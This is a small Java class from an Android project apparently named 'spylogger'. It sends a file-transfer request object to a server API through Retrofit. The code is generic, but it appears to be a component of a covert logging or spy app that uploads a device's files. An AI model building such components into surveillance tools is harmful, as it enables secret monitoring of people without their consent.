package com.gravatasufoca.spylogger.services;

import android.content.Context;

import com.gravatasufoca.spylogger.helpers.TaskComplete;
import com.gravatasufoca.spylogger.vos.EnvioArquivoVO;

import java.util.List;

import retrofit2.Call;

/**
 * Created by bruno on 02/12/16.
 */

public class SendSolicitacoesArquivos extends SendDataService<List<Integer>> {

    public SendSolicitacoesArquivos(Context context,TaskComplete handler) {
        super(context,handler);
    }

    public void enviar(EnvioArquivoVO envioArquivoVO){
        Call<List<Integer>> call=sendApi.receberArquivos(envioArquivoVO);
        call.enqueue(this);
    }

}
